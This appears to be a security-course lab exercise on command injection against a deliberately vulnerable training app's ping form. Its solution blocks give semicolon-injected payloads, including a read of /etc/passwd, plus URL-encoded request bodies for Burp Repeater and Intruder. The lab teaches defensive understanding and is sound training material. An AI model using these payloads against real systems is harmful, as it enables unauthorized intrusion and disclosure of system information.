# My First Command Injection
In this exercise, you'll use the semicolon operator to inject commands to a vulnerable server.

---


## Instructions
- Click the **Command Injection** vulnerability in the left navigation bar.

### Direct Injection
- Submit a valid IP address, such as `8.8.4.4` to see the form's normal behavior.

- Use the semicolon to inject commands that:
  - Dump the contents of `/etc/passwd`
  - Print the current username
  - Print the operating system and kernel version
  - Print all running processes
  > **Solution**
  > ```bash
  > # Dump the contents of `/etc/passwd`
  > 8.8.4.4; cat /etc/passwd
  > # Print the current username
  > 8.8.4.4; whoami
  > # Print the operating system and kernel version
  > 8.8.4.4; uname
  > # Print all running processes
  > 8.8.4.4; ps aux
  > ```

- Finally, change your injection to use a _bad_ IP address, such as `fake_ip`. How does the output change?
  > **Solution**: Try injecting `bad; ls`. You'll get output from `ls`, but no error message from `ping`.

### Burp Repeater
- Enable Foxy Proxy, launch Burp Suite, and intercept a request through the IP address form.

- Send the request to Repeater. Update the IP address to use the same payloads you delivered previously.
  - Remember to encode spaces as `%20` or `+`.
  > **Solutions**
  >  - `ip=8.8.4.4;%20cat%20/etc/passwd&Submit=submit`
  >  - `ip=8.8.4.4;%20whoami&Submit=submit`
  >  - `ip=8.8.4.4;%20uname&Submit=submit`
  >  - `ip=8.8.4.4;%20ps%20aux&Submit=submit`

- Inspect the **Response** tab to see the results.

### Burp Intruder
- Next, send the request to Intruder. Set a position around the command you're injecting. Then, use the three commands you sent previously as **Payloads**.

- Run the attack, and inspect the responses in the **Attack** pane.
